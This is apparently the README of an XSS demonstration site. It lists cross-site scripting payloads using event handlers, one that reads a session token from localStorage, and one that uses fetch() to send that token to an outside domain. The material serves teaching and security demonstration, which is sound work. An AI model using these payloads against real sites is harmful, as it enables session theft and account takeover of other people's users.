# XSS Demo
*A live version of this site can be found at https://xss.jamiepegg.com*

## Example: Payloads

* `<code id=x tabindex=1 onfocus=alert(1)></code>`
* `<img src=1 onerror=alert(1) />`
* `<p onmouseover="alert(1)">test</p>`
* `<p onmouseenter="alert(1)">test</p>`

## Example: Stealing a session token from local storage

* `<img src=1 onerror=alert(localStorage.getItem('session')) />`

## Example: OOB exfiltration

*For demo purposes, sites such as https://webhook.site/ can be used*

* `<img src=1 onerror=(fetch(`https://jamiepegg.com?session=${localStorage.getItem('session')}`)) />`
